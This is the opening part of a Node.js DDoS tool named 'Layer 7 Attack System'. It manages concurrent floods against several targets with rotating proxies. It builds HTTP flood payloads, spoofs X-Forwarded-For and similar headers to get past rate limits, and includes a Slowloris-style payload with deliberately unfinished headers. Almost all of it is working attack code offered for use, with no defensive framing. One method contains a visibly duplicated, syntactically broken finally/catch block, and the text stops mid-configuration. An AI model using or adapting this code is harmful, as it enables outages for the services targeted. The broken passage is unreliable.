// worker/farmily7.js - Layer 7 Attack System
const fs = require('fs');
const http = require('http');
const https = require('https');
const net = require('net');
const crypto = require('crypto');
const os = require('os');
const { performance } = require('perf_hooks');
const url = require('url');
const { promisify } = require('util');
const EventEmitter = require('events');
const cluster = require('cluster');
const { Worker } = require('worker_threads');
const path = require('path');
const zlib = require('zlib');

// Colors for console output
const Colors = {
    GREEN: '\x1b[32m', RED: '\x1b[31m', YELLOW: '\x1b[33m', BLUE: '\x1b[34m',
    MAGENTA: '\x1b[35m', CYAN: '\x1b[36m', WHITE: '\x1b[37m', GRAY: '\x1b[90m',
    BRIGHT_RED: '\x1b[91m', BRIGHT_GREEN: '\x1b[92m', BRIGHT_YELLOW: '\x1b[93m',
    RESET: '\x1b[0m', BOLD: '\x1b[1m', DIM: '\x1b[2m'
};

// Global Resource Manager
class GlobalResourceManager extends EventEmitter {
    constructor() {
        super();
        if (GlobalResourceManager.instance) {
            return GlobalResourceManager.instance;
        }
        
        GlobalResourceManager.instance = this;
        
        this.totalConnections = 0;
        this.maxGlobalConnections = os.cpus().length * 1000; // Scale with CPU cores
        this.activeAttacks = new Map();
        this.sharedProxies = new Map();
        this.globalStats = {
            totalBandwidth: 0,
            totalRequests: 0,
            totalErrors: 0,
            startTime: Date.now(),
            activeTargets: new Set()
        };
        
        this.resourceLimits = {
            maxMemoryPercent: 85,
            maxCpuPercent: 90,
            maxConnections: this.maxGlobalConnections,
            maxThreadsPerAttack: Math.max(os.cpus().length * 4, 200)
        };
        
        this.monitoringInterval = null;
        this.startGlobalMonitoring();
    }

    static getInstance() {
        if (!GlobalResourceManager.instance) {
            new GlobalResourceManager();
        }
        return GlobalResourceManager.instance;
    }

    registerAttack(attackId, attack) {
        this.activeAttacks.set(attackId, attack);
        this.globalStats.activeTargets.add(attack.config.target);
        this.emit('attack-registered', { attackId, target: attack.config.target });
    }

    unregisterAttack(attackId) {
        const attack = this.activeAttacks.get(attackId);
        if (attack) {
            this.globalStats.activeTargets.delete(attack.config.target);
            this.activeAttacks.delete(attackId);
            this.emit('attack-unregistered', { attackId });
        }
    }

    allocateConnections(requestedConnections, attackId) {
        const availableConnections = this.maxGlobalConnections - this.totalConnections;
        const allocated = Math.min(requestedConnections, availableConnections);
        
        if (allocated > 0) {
            this.totalConnections += allocated;
            this.emit('connections-allocated', { attackId, allocated, total: this.totalConnections });
        }
        
        return allocated;
    }

    releaseConnections(connectionCount, attackId) {
        this.totalConnections = Math.max(0, this.totalConnections - connectionCount);
        this.emit('connections-released', { attackId, released: connectionCount, total: this.totalConnections });
    }

    updateGlobalStats(stats) {
        this.globalStats.totalBandwidth += stats.bandwidth || 0;
        this.globalStats.totalRequests += stats.requests || 0;
        this.globalStats.totalErrors += stats.errors || 0;
        this.emit('global-stats-updated', this.globalStats);
    }

    getGlobalStats() {
        const uptime = (Date.now() - this.globalStats.startTime) / 1000;
        return {
            ...this.globalStats,
            uptime,
            activeAttacks: this.activeAttacks.size,
            totalConnections: this.totalConnections,
            availableConnections: this.maxGlobalConnections - this.totalConnections,
            memoryUsage: process.memoryUsage(),
            resourceUtilization: {
                connections: (this.totalConnections / this.maxGlobalConnections * 100).toFixed(2) + '%',
                memory: (process.memoryUsage().heapUsed / process.memoryUsage().heapTotal * 100).toFixed(2) + '%'
            }
        };
    }

    getResourceLimits() {
        return { ...this.resourceLimits };
    }

    canAllocateResources(requestedThreads, requestedConnections) {
        const currentMemory = process.memoryUsage().heapUsed / process.memoryUsage().heapTotal * 100;
        const availableConnections = this.maxGlobalConnections - this.totalConnections;
        
        return {
            canProceed: currentMemory < this.resourceLimits.maxMemoryPercent && 
                       availableConnections >= requestedConnections &&
                       requestedThreads <= this.resourceLimits.maxThreadsPerAttack,
            reasons: {
                memory: currentMemory < this.resourceLimits.maxMemoryPercent,
                connections: availableConnections >= requestedConnections,
                threads: requestedThreads <= this.resourceLimits.maxThreadsPerAttack
            },
            available: {
                memory: this.resourceLimits.maxMemoryPercent - currentMemory,
                connections: availableConnections,
                maxThreads: this.resourceLimits.maxThreadsPerAttack
            }
        };
    }

    startGlobalMonitoring() {
        if (this.monitoringInterval) return;
        
        this.monitoringInterval = setInterval(() => {
            const stats = this.getGlobalStats();
            this.emit('global-monitoring-update', stats);
            this.adjustResourceLimits(stats);
        }, 2000);
    }

    adjustResourceLimits(stats) {
        const memoryPercent = stats.memoryUsage.heapUsed / stats.memoryUsage.heapTotal * 100;
        if (memoryPercent > 80) {
            this.maxGlobalConnections = Math.max(100, this.maxGlobalConnections * 0.9);
        } else if (memoryPercent < 50 && this.maxGlobalConnections < os.cpus().length * 1000) {
            this.maxGlobalConnections = Math.min(os.cpus().length * 1000, this.maxGlobalConnections * 1.1);
        }
    }

    stopGlobalMonitoring() {
        if (this.monitoringInterval) {
            clearInterval(this.monitoringInterval);
            this.monitoringInterval = null;
        }
    }

    cleanup() {
        this.stopGlobalMonitoring();
        this.activeAttacks.clear();
        this.sharedProxies.clear();
        this.totalConnections = 0;
    }
}

// Logger
class Logger extends EventEmitter {
    constructor(module = 'LAYER7') {
        super();
        this.logLevel = process.env.LOG_LEVEL || 'info';
        this.logFile = null;
        this.logBuffer = [];
        this.maxBufferSize = 1000;
        this.module = module;
        
        this.levels = {
            debug: 0,
            info: 1,
            warn: 2,
            error: 3,
            critical: 4
        };
    }

    setLogFile(filePath) {
        this.logFile = filePath;
        this.info(`Logging to file: ${filePath}`);
    }

    shouldLog(level) {
        return this.levels[level] >= this.levels[this.logLevel];
    }

    formatMessage(message, level, attackId = null, targetId = null) {
        const timestamp = new Date().toISOString();
        const prefix = attackId ? `[${attackId}${targetId ? `/${targetId}` : ''}]` : '';
        return {
            timestamp,
            level: level.toUpperCase(),
            attackId,
            targetId,
            message,
            module: this.module,
            formatted: `[${this.module}]${prefix}[${level.toUpperCase()} ${timestamp}] ${message}`
        };
    }

    log(message, level = 'info', color = Colors.GREEN, attackId = null, targetId = null) {
        if (!this.shouldLog(level)) return;
        
        const logEntry = this.formatMessage(message, level, attackId, targetId);
        
        // Console output
        console.log(`${color}${logEntry.formatted}${Colors.RESET}`);
        
        // File output
        if (this.logFile) {
            fs.appendFileSync(this.logFile, logEntry.formatted + '\n');
        }
        
        // Buffer for retrieval
        this.logBuffer.push(logEntry);
        if (this.logBuffer.length > this.maxBufferSize) {
            this.logBuffer.shift();
        }
        
        // Emit for external handling
        this.emit('log', logEntry);
    }

    debug(message, attackId = null, targetId = null) {
        this.log(message, 'debug', Colors.GRAY, attackId, targetId);
    }

    info(message, attackId = null, targetId = null) {
        this.log(message, 'info', Colors.GREEN, attackId, targetId);
    }

    warn(message, attackId = null, targetId = null) {
        this.log(message, 'warn', Colors.YELLOW, attackId, targetId);
    }

    error(message, attackId = null, targetId = null) {
        this.log(message, 'error', Colors.RED, attackId, targetId);
    }

    critical(message, attackId = null, targetId = null) {
        this.log(message, 'critical', Colors.BRIGHT_RED, attackId, targetId);
    }

    success(message, attackId = null, targetId = null) {
        this.log(message, 'info', Colors.BRIGHT_GREEN, attackId, targetId);
    }

    getRecentLogs(count = 100, attackId = null, level = null) {
        let logs = this.logBuffer.slice(-count);
        
        if (attackId) {
            logs = logs.filter(log => log.attackId === attackId);
        }
        
        if (level) {
            logs = logs.filter(log => log.level.toLowerCase() === level.toLowerCase());
        }
        
        return logs;
    }
}

// Multi-Target Statistics Manager
class MultiTargetStats extends EventEmitter {
    constructor() {
        super();
        this.targetStats = new Map();
        this.globalStats = {
            totalTargets: 0,
            totalRequests: 0,
            totalBytes: 0,
            totalErrors: 0,
            startTime: 0,
            endTime: 0
        };
        this.monitoringInterval = null;
    }

    initializeTarget(targetId, targetInfo) {
        this.targetStats.set(targetId, {
            targetId,
            target: targetInfo.target,
            startTime: performance.now(),
            endTime: 0,
            requests: 0,
            bytes: 0,
            errors: 0,
            successfulRequests: 0,
            failedRequests: 0,
            averageResponseTime: 0,
            responseTimeHistory: [],
            bandwidthHistory: [],
            statusCodes: new Map(),
            errorTypes: new Map(),
            isActive: true
        });
        
        this.globalStats.totalTargets++;
        if (this.globalStats.startTime === 0) {
            this.globalStats.startTime = performance.now();
        }
    }

    updateTargetStats(targetId, update) {
        const stats = this.targetStats.get(targetId);
        if (!stats) return;

        // Update individual target stats
        if (update.requests) stats.requests += update.requests;
        if (update.bytes) stats.bytes += update.bytes;
        if (update.errors) stats.errors += update.errors;
        if (update.successful) stats.successfulRequests += update.successful;
        if (update.failed) stats.failedRequests += update.failed;
        
        if (update.responseTime) {
            stats.responseTimeHistory.push(update.responseTime);
            if (stats.responseTimeHistory.length > 1000) {
                stats.responseTimeHistory.shift();
            }
            stats.averageResponseTime = stats.responseTimeHistory.reduce((a, b) => a + b, 0) / stats.responseTimeHistory.length;
        }

        if (update.bandwidth) {
            stats.bandwidthHistory.push({
                timestamp: Date.now(),
                bandwidth: update.bandwidth
            });
            // Keep last 60 seconds
            const oneMinuteAgo = Date.now() - 60000;
            stats.bandwidthHistory = stats.bandwidthHistory.filter(b => b.timestamp > oneMinuteAgo);
        }

        if (update.statusCode) {
            const count = stats.statusCodes.get(update.statusCode) || 0;
            stats.statusCodes.set(update.statusCode, count + 1);
        }

        if (update.errorType) {
            const count = stats.errorTypes.get(update.errorType) || 0;
            stats.errorTypes.set(update.errorType, count + 1);
        }

        // Update global stats
        if (update.requests) this.globalStats.totalRequests += update.requests;
        if (update.bytes) this.globalStats.totalBytes += update.bytes;
        if (update.errors) this.globalStats.totalErrors += update.errors;

        this.emit('target-stats-updated', { targetId, stats });
        this.emit('global-stats-updated', this.getGlobalSummary());
    }

    finalizeTarget(targetId) {
        const stats = this.targetStats.get(targetId);
        if (stats) {
            stats.endTime = performance.now();
            stats.isActive = false;
            this.emit('target-finalized', { targetId, stats });
        }
    }

    getCurrentBandwidth(targetId) {
        const stats = this.targetStats.get(targetId);
        if (!stats || stats.bandwidthHistory.length === 0) return 0;
        
        const recent = stats.bandwidthHistory.slice(-5);
        return recent.reduce((sum, record) => sum + record.bandwidth, 0) / recent.length;
    }

    getTargetSummary(targetId) {
        const stats = this.targetStats.get(targetId);
        if (!stats) return null;

        const duration = (stats.endTime || performance.now()) - stats.startTime;
        const durationSeconds = duration / 1000;

        return {
            targetId: stats.targetId,
            target: stats.target,
            duration: durationSeconds.toFixed(2),
            requestsPerSecond: durationSeconds > 0 ? (stats.requests / durationSeconds).toFixed(2) : 0,
            successRate: stats.requests > 0 ? ((stats.successfulRequests / stats.requests) * 100).toFixed(2) : 0,
            totalRequests: stats.requests,
            totalBytes: stats.bytes,
            totalBytesFormatted: this.formatBytes(stats.bytes),
            averageResponseTime: stats.averageResponseTime.toFixed(2),
            currentBandwidth: this.getCurrentBandwidth(targetId),
            currentBandwidthFormatted: this.formatBytes(this.getCurrentBandwidth(targetId)) + '/s',
            statusCodes: Object.fromEntries(stats.statusCodes),
            errorSummary: Object.fromEntries(stats.errorTypes),
            isActive: stats.isActive
        };
    }

    getGlobalSummary() {
        const activeTargets = Array.from(this.targetStats.values()).filter(s => s.isActive);
        const totalCurrentBandwidth = activeTargets.reduce((sum, stats) => sum + this.getCurrentBandwidth(stats.targetId), 0);
        
        const duration = (this.globalStats.endTime || performance.now()) - this.globalStats.startTime;
        const durationSeconds = duration / 1000;

        return {
            totalTargets: this.globalStats.totalTargets,
            activeTargets: activeTargets.length,
            totalRequests: this.globalStats.totalRequests,
            totalBytes: this.globalStats.totalBytes,
            totalBytesFormatted: this.formatBytes(this.globalStats.totalBytes),
            totalErrors: this.globalStats.totalErrors,
            duration: durationSeconds.toFixed(2),
            averageRequestsPerSecond: durationSeconds > 0 ? (this.globalStats.totalRequests / durationSeconds).toFixed(2) : 0,
            currentTotalBandwidth: totalCurrentBandwidth,
            currentTotalBandwidthFormatted: this.formatBytes(totalCurrentBandwidth) + '/s',
            targets: Array.from(this.targetStats.keys()).map(id => this.getTargetSummary(id))
        };
    }

    formatBytes(bytes) {
        const units = ['B', 'KB', 'MB', 'GB', 'TB'];
        let size = bytes;
        let unitIndex = 0;

        while (size >= 1024 && unitIndex < units.length - 1) {
            size /= 1024;
            unitIndex++;
        }

        return `${size.toFixed(2)} ${units[unitIndex]}`;
    }

    finalize() {
        this.globalStats.endTime = performance.now();
        Array.from(this.targetStats.keys()).forEach(targetId => {
            this.finalizeTarget(targetId);
        });
    }

    startRealTimeMonitoring() {
        if (this.monitoringInterval) return;
        
        this.monitoringInterval = setInterval(() => {
            this.emit('real-time-update', this.getGlobalSummary());
        }, 1000);
    }

    stopRealTimeMonitoring() {
        if (this.monitoringInterval) {
            clearInterval(this.monitoringInterval);
            this.monitoringInterval = null;
        }
    }
}

// Advanced Proxy Manager with rotation, validation, and performance tracking
class ProxyManager extends EventEmitter {
    constructor() {
        super();
        this.proxies = [];
        this.workingProxies = new Set();
        this.failedProxies = new Map(); // Map to track failure reasons and counts
        this.proxyPerformance = new Map(); // Track response times and success rates
        this.currentIndex = 0;
        this.rotationStrategy = 'round-robin'; // 'round-robin', 'random', 'performance-based'
        this.validationInProgress = new Set();
    }

    loadProxies(proxyList) {
        this.proxies = proxyList.map(proxy => this.parseProxy(proxy));
        this.workingProxies.clear();
        this.failedProxies.clear();
        this.proxyPerformance.clear();
        
        logger.info(`Loaded ${this.proxies.length} proxies`);
        this.emit('proxies-loaded', { total: this.proxies.length });
        
        // Start background validation
        this.validateProxiesInBackground();
    }

    parseProxy(proxyString) {
        const parts = proxyString.split(':');
        if (parts.length >= 2) {
            return {
                host: parts[0],
                port: parseInt(parts[1]),
                username: parts[2] || null,
                password: parts[3] || null,
                type: parts[4] || 'http', // http, socks4, socks5
                original: proxyString,
                id: crypto.createHash('md5').update(proxyString).digest('hex').substring(0, 8)
            };
        }
        throw new Error(`Invalid proxy format: ${proxyString}`);
    }

    async validateProxiesInBackground() {
        const validationPromises = this.proxies.map(proxy => this.validateProxy(proxy));
        const results = await Promise.allSettled(validationPromises);
        
        let working = 0;
        let failed = 0;
        
        results.forEach((result, index) => {
            if (result.status === 'fulfilled' && result.value) {
                working++;
            } else {
                failed++;
            }
        });
        
        logger.info(`Proxy validation complete: ${working} working, ${failed} failed`);
        this.emit('validation-complete', { working, failed, total: this.proxies.length });
    }

    async validateProxy(proxy) {
        if (this.validationInProgress.has(proxy.id)) {
            return false;
        }
        
        this.validationInProgress.add(proxy.id);
        
        try {
            const startTime = performance.now();
            
            // Simple validation - try to connect
            const socket = new net.Socket();
            socket.setTimeout(5000);
            
            const isValid = await new Promise((resolve) => {
                socket.connect(proxy.port, proxy.host, () => {
                    socket.destroy();
                    resolve(true);
                });
                
                socket.on('error', () => {
                    socket.destroy();
                    resolve(false);
                });
                
                socket.on('timeout', () => {
                    socket.destroy();
                    resolve(false);
                });
            });
            
            const responseTime = performance.now() - startTime;
            
            if (isValid) {
                this.markProxyWorking(proxy, responseTime);
                return true;
            } else {
                this.markProxyFailed(proxy, 'Connection failed');
                return false;
            }
            
        } catch (error) {
            this.markProxyFailed(proxy, error.message);
            return false;
        } finally {
            this.validationInProgress.delete(proxy.id);
        }
    }

    getNextProxy() {
        if (this.proxies.length === 0) return null;
        
        switch (this.rotationStrategy) {
            case 'random':
                return this.getRandomProxy();
            case 'performance-based':
                return this.getPerformanceBasedProxy();
            case 'round-robin':
            default:
                return this.getRoundRobinProxy();
        }
    }

    getRoundRobinProxy() {
        // Prefer working proxies
        const workingProxiesList = this.proxies.filter(p => 
            this.workingProxies.has(p.original) && !this.failedProxies.has(p.original)
        );
        
        if (workingProxiesList.length > 0) {
            const proxy = workingProxiesList[this.currentIndex % workingProxiesList.length];
            this.currentIndex = (this.currentIndex + 1) % workingProxiesList.length;
            return proxy;
        }
        
        // Fall back to all proxies
        const proxy = this.proxies[this.currentIndex % this.proxies.length];
        this.currentIndex = (this.currentIndex + 1) % this.proxies.length;
        return proxy;
    }

    getRandomProxy() {
        const workingProxiesList = this.proxies.filter(p => 
            this.workingProxies.has(p.original) && !this.failedProxies.has(p.original)
        );
        
        const sourceList = workingProxiesList.length > 0 ? workingProxiesList : this.proxies;
        return sourceList[Math.floor(Math.random() * sourceList.length)];
    }

    getPerformanceBasedProxy() {
        const workingProxiesList = this.proxies.filter(p => 
            this.workingProxies.has(p.original) && this.proxyPerformance.has(p.original)
        );
        
        if (workingProxiesList.length === 0) {
            return this.getRoundRobinProxy();
        }
        
        // Sort by performance (lower response time = better)
        workingProxiesList.sort((a, b) => {
            const perfA = this.proxyPerformance.get(a.original);
            const perfB = this.proxyPerformance.get(b.original);
            return perfA.averageResponseTime - perfB.averageResponseTime;
        });
        
        // Return one of the top 3 performers (randomized for load distribution)
        const topPerformers = workingProxiesList.slice(0, Math.min(3, workingProxiesList.length));
        return topPerformers[Math.floor(Math.random() * topPerformers.length)];
    }

    markProxyWorking(proxy, responseTime = 0) {
        this.workingProxies.add(proxy.original);
        this.failedProxies.delete(proxy.original);
        
        // Update performance tracking
        if (!this.proxyPerformance.has(proxy.original)) {
            this.proxyPerformance.set(proxy.original, {
                successCount: 0,
                failureCount: 0,
                responseTimes: [],
                averageResponseTime: 0
            });
        }
        
        const perf = this.proxyPerformance.get(proxy.original);
        perf.successCount++;
        
        if (responseTime > 0) {
            perf.responseTimes.push(responseTime);
            if (perf.responseTimes.length > 100) {
                perf.responseTimes.shift();
            }
            perf.averageResponseTime = perf.responseTimes.reduce((a, b) => a + b, 0) / perf.responseTimes.length;
        }
        
        this.emit('proxy-working', { proxy, responseTime });
    }

    markProxyFailed(proxy, reason = 'Unknown error') {
        this.failedProxies.set(proxy.original, {
            reason,
            timestamp: Date.now(),
            failureCount: (this.failedProxies.get(proxy.original)?.failureCount || 0) + 1
        });
        
        this.workingProxies.delete(proxy.original);
        
        // Update performance tracking
        if (this.proxyPerformance.has(proxy.original)) {
            this.proxyPerformance.get(proxy.original).failureCount++;
        }
        
        this.emit('proxy-failed', { proxy, reason });
    }

    getStats() {
        const performance = Array.from(this.proxyPerformance.entries()).map(([original, perf]) => ({
            proxy: original,
            successRate: perf.successCount / (perf.successCount + perf.failureCount) * 100,
            averageResponseTime: perf.averageResponseTime,
            totalRequests: perf.successCount + perf.failureCount
        }));
        
        return {
            total: this.proxies.length,
            working: this.workingProxies.size,
            failed: this.failedProxies.size,
            untested: this.proxies.length - this.workingProxies.size - this.failedProxies.size,
            rotationStrategy: this.rotationStrategy,
            performance: performance.sort((a, b) => b.successRate - a.successRate)
        };
    }

    setRotationStrategy(strategy) {
        if (['round-robin', 'random', 'performance-based'].includes(strategy)) {
            this.rotationStrategy = strategy;
            logger.info(`Proxy rotation strategy set to: ${strategy}`);
        }
    }
}

// Threading Manager with worker threads and clustering
class ThreadingManager extends EventEmitter {
    constructor() {
        super();
        this.workers = new Map();
        this.workerPool = [];
        this.maxWorkers = os.cpus().length * 2;
        this.activeWorkers = 0;
        this.taskQueue = [];
        this.workerStats = new Map();
        this.useWorkerThreads = false; // Enable for CPU-intensive tasks
    }

    async initializeWorkerPool(poolSize = this.maxWorkers) {
        if (!this.useWorkerThreads) return;
        
        logger.info(`Initializing worker thread pool with ${poolSize} workers`);
        
        for (let i = 0; i < poolSize; i++) {
            await this.createWorker();
        }
        
        logger.success(`Worker pool initialized with ${this.workerPool.length} workers`);
    }

    async createWorker() {
        if (!this.useWorkerThreads) return null;
        
        const workerId = crypto.randomUUID().substring(0, 8);
        
        // Note: In a real implementation, you'd create a separate worker script file
        // For now, we'll simulate worker functionality with regular threads
        const worker = {
            id: workerId,
            isAvailable: true,
            currentTask: null,
            stats: {
                tasksCompleted: 0,
                totalTime: 0,
                errors: 0
            }
        };
        
        this.workerPool.push(worker);
        this.workerStats.set(workerId, worker.stats);
        
        return worker;
    }

    getAvailableWorker() {
        return this.workerPool.find(worker => worker.isAvailable);
    }

    async executeTask(task, useWorker = false) {
        if (useWorker && this.useWorkerThreads) {
            return await this.executeWithWorker(task);
        } else {
            return await this.executeDirectly(task);
        }
    }

    async executeWithWorker(task) {
        const worker = this.getAvailableWorker();
        
        if (!worker) {
            // Queue the task if no workers available
            return new Promise((resolve, reject) => {
                this.taskQueue.push({ task, resolve, reject });
            });
        }
        
        worker.isAvailable = false;
        worker.currentTask = task;
        
        const startTime = performance.now();
        
        try {
            // Simulate worker execution
            const result = await this.executeDirectly(task);
            
            const executionTime = performance.now() - startTime;
            worker.stats.tasksCompleted++;
            worker.stats.totalTime += executionTime;
            
            this.emit('task-completed', { workerId: worker.id, executionTime, result });
            
            return result;
        } catch (error) {
            worker.stats.errors++;
            this.emit('task-failed', { workerId: worker.id, error });
            throw error;
        } finally { return result;
        } catch (error) {
            worker.stats.errors++;
            this.emit('task-failed', { workerId: worker.id, error });
            throw error;
        } finally {
            worker.isAvailable = true;
            worker.currentTask = null;
            
            // Process queued tasks
            if (this.taskQueue.length > 0) {
                const queued = this.taskQueue.shift();
                setImmediate(() => {
                    this.executeWithWorker(queued.task)
                        .then(queued.resolve)
                        .catch(queued.reject);
                });
            }
        }
    }

    async executeDirectly(task) {
        // Direct execution without worker threads
        return await task.execute();
    }

    getWorkerStats() {
        return {
            totalWorkers: this.workerPool.length,
            activeWorkers: this.workerPool.filter(w => !w.isAvailable).length,
            queuedTasks: this.taskQueue.length,
            workerPerformance: Array.from(this.workerStats.entries()).map(([id, stats]) => ({
                workerId: id,
                tasksCompleted: stats.tasksCompleted,
                averageTime: stats.tasksCompleted > 0 ? stats.totalTime / stats.tasksCompleted : 0,
                errorRate: stats.tasksCompleted > 0 ? (stats.errors / stats.tasksCompleted * 100).toFixed(2) + '%' : '0%'
            }))
        };
    }

    async shutdown() {
        logger.info('Shutting down threading manager...');
        
        // Wait for active tasks to complete
        while (this.workerPool.some(w => !w.isAvailable)) {
            await new Promise(resolve => setTimeout(resolve, 100));
        }
        
        this.workerPool = [];
        this.taskQueue = [];
        this.workerStats.clear();
        
        logger.success('Threading manager shutdown complete');
    }
}

// Advanced Utilities
class AdvancedUtils {
    static async resolveTargets(targets) {
        const dnsLookup = promisify(dns.lookup);
        const results = new Map();
        
        const resolvePromises = targets.map(async (target) => {
            try {
                const normalized = this.normalizeTarget(target.target);
                const hostname = normalized.hostname;

                // If it's already an IP address, return it
                if (/^(\d{1,3}\.){3}\d{1,3}$/.test(hostname)) {
                    results.set(target.id, { ...normalized, ip: hostname, resolved: true });
                    return;
                }

                // If it's localhost, return localhost
                if (hostname === 'localhost') {
                    results.set(target.id, { ...normalized, ip: 'localhost', resolved: true });
                    return;
                }

                // Try DNS lookup with timeout
                const address = await Promise.race([
                    dnsLookup(hostname),
                    new Promise((_, reject) => 
                        setTimeout(() => reject(new Error('DNS timeout')), 5000)
                    )
                ]);

                results.set(target.id, { ...normalized, ip: address.address, resolved: true });
                logger.debug(`Resolved ${hostname} to ${address.address}`, null, target.id);
            } catch (error) {
                logger.warn(`DNS resolution failed for ${target.target}: ${error.message}, using hostname directly`, null, target.id);
                const normalized = this.normalizeTarget(target.target);
                results.set(target.id, { ...normalized, ip: normalized.hostname, resolved: false });
            }
        });

        await Promise.allSettled(resolvePromises);
        return results;
    }

    static normalizeTarget(target) {
        // Ensure target has a protocol for URL parsing
        if (!target.startsWith('http://') && !target.startsWith('https://')) {
            target = `http://${target}`;
        }

        const parsedUrl = url.parse(target);
        const hostname = parsedUrl.hostname || 'localhost';
        const port = parsedUrl.port || (parsedUrl.protocol === 'https:' ? '443' : '80');

        return {
            hostname,
            port: parseInt(port),
            fullTarget: `${hostname}:${port}`,
            protocol: parsedUrl.protocol || 'http:',
            path: parsedUrl.path || '/'
        };
    }

    static generatePayload(type, target, config = {}) {
        switch(type.toUpperCase()) {
            case 'GET':
                return this.createHTTPPayload('GET', target, config);
            case 'POST':
                return this.createHTTPPayload('POST', target, config);
            case 'HEAD':
                return this.createHTTPPayload('HEAD', target, config);
            case 'PUT':
                return this.createHTTPPayload('PUT', target, config);
            case 'DELETE':
                return this.createHTTPPayload('DELETE', target, config);
            case 'OPTIONS':
                return this.createHTTPPayload('OPTIONS', target, config);
            case 'SLOW':
                return this.createSlowPayload(target, config);
            default:
                return this.createHTTPPayload('GET', target, config);
        }
    }

    static createHTTPPayload(method, target, config = {}) {
        const userAgent = this.getRandomUserAgent(config.userAgents);
        const normalizedTarget = this.normalizeTarget(target);
        
        let headers = [
            `${method} ${normalizedTarget.path} HTTP/1.1`,
            `Host: ${normalizedTarget.hostname}`,
            `User-Agent: ${userAgent}`,
            `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8`,
            `Accept-Language: en-US,en;q=0.5`,
            `Accept-Encoding: gzip, deflate`,
            `DNT: 1`,
            `Connection: ${config.keepAlive ? 'keep-alive' : 'close'}`,
            `Cache-Control: no-cache`
        ];

        // Add rate limit bypass headers
        if (config.rateLimitBypass) {
            headers.push(`X-Forwarded-For: ${this.randomIP()}`);
            headers.push(`X-Real-IP: ${this.randomIP()}`);
            headers.push(`X-Originating-IP: ${this.randomIP()}`);
            headers.push(`X-Remote-IP: ${this.randomIP()}`);
            headers.push(`X-Remote-Addr: ${this.randomIP()}`);
        }

        // Add cookies if provided
        if (config.cookies && config.cookies.length > 0) {
            const cookieHeader = config.cookies.join('; ');
            headers.push(`Cookie: ${cookieHeader}`);
        }

        // Add custom headers if provided
        if (config.headers && Object.keys(config.headers).length > 0) {
            Object.entries(config.headers).forEach(([key, value]) => {
                headers.push(`${key}: ${value}`);
            });
        }

        // Add body for POST/PUT methods
        let body = '';
        if (['POST', 'PUT'].includes(method)) {
            let data;
            
            if (config.formData) {
                // Form data
                const formParts = [];
                Object.entries(config.formData).forEach(([key, value]) => {
                    formParts.push(`${encodeURIComponent(key)}=${encodeURIComponent(value)}`);
                });
                data = formParts.join('&');
                headers.push(`Content-Type: application/x-www-form-urlencoded`);
            } else if (config.postData) {
                // JSON data
                data = typeof config.postData === 'string' ? 
                    config.postData : JSON.stringify(config.postData);
                headers.push(`Content-Type: application/json`);
            } else {
                // Random data
                data = config.randomizePayload ? 
                    this.randomString(config.payloadSize || 256) : 
                    'A'.repeat(config.payloadSize || 256);
                headers.push(`Content-Type: application/x-www-form-urlencoded`);
            }
            
            headers.push(`Content-Length: ${Buffer.byteLength(data)}`);
            body = data;
        }

        return Buffer.from(headers.join('\r\n') + '\r\n\r\n' + body);
    }

    static createSlowPayload(target, config = {}) {
        const userAgent = this.getRandomUserAgent(config.userAgents);
        const normalizedTarget = this.normalizeTarget(target);
        
        // Slowloris-style attack - incomplete headers
        const headers = [
            `GET ${normalizedTarget.path} HTTP/1.1`,
            `Host: ${normalizedTarget.hostname}`,
            `User-Agent: ${userAgent}`,
            `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
            `Connection: keep-alive`,
            `Keep-Alive: timeout=1000, max=1000`,
            `X-a: ${this.randomString(16)}`
            // Intentionally incomplete - no final \r\n\r\n
        ];

        return Buffer.from(headers.join('\r\n') + '\r\n');
    }

    static randomString(length) {
        return crypto.randomBytes(Math.ceil(length/2))
            .toString('hex')
            .slice(0, length);
    }

    static randomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    static randomIP() {
        return `${this.randomInt(1, 254)}.${this.randomInt(1, 254)}.${this.randomInt(1, 254)}.${this.randomInt(1, 254)}`;
    }

    static getRandomUserAgent(userAgents) {
        if (!userAgents || userAgents.length === 0) {
            return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
        }
        return userAgents[this.randomInt(0, userAgents.length - 1)];
    }

    static sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    static formatDuration(ms) {
        const seconds = Math.floor(ms / 1000);
        const minutes = Math.floor(seconds / 60);
        const hours = Math.floor(minutes / 60);
        
        if (hours > 0) {
            return `${hours}h ${minutes % 60}m ${seconds % 60}s`;
        } else if (minutes > 0) {
            return `${minutes}m ${seconds % 60}s`;
        } else {
            return `${seconds}s`;
        }
    }

    static formatBytes(bytes) {
        const units = ['B', 'KB', 'MB', 'GB', 'TB'];
        let size = bytes;
        let unitIndex = 0;

        while (size >= 1024 && unitIndex < units.length - 1) {
            size /= 1024;
            unitIndex++;
        }

        return `${size.toFixed(2)} ${units[unitIndex]}`;
    }
}

// Layer 7 Config
class Layer7Config {
    constructor(options = {}) {
        this.targets = this.parseTargets(options.targets || []);
        this.method = options.method?.toUpperCase() || 'GET';
        this.layer = 'LAYER7'; // Fixed for this module
        this.duration = options.duration || 60;
        this.threadsPerTarget = options.threadsPerTarget || Math.max(os.cpus().length, 10);
        this.maxConcurrentTargets = options.maxConcurrentTargets || 10;
        this.targetDelay = options.targetDelay || 0; // Delay between starting targets
        this.globalTimeout = options.globalTimeout || 5000;
        this.useProxies = options.useProxies || false;
        this.proxyList = options.proxyList || [];
        this.rotateProxiesPerTarget = options.rotateProxiesPerTarget || true;
        this.rampUpTime = options.rampUpTime || 0;
        this.coordinateTargets = options.coordinateTargets !== false;
        this.adaptiveScaling = options.adaptiveScaling !== false;
        this.resourceSharing = options.resourceSharing !== false;
        this.userAgents = options.userAgents || this.getDefaultUserAgents();
        this.payloadSize = options.payloadSize || 1024;
        this.randomizePayload = options.randomizePayload !== false;
        this.rateLimitBypass = options.rateLimitBypass || false;
        this.followRedirects = options.followRedirects || false;
        this.keepAlive = options.keepAlive || false;
        this.cookies = options.cookies || [];
        this.headers = options.headers || {};
        this.httpVersion = options.httpVersion || '1.1';
        this.postData = options.postData || null;
        this.formData = options.formData || null;
        this.requestsPerThread = options.requestsPerThread || 0; // 0 = unlimited
        this.requestRate = options.requestRate || 0; // Requests per second per thread (0 = unlimited)
        this.slowRequestsRate = options.slowRequestsRate || 10; // Slow attack specific
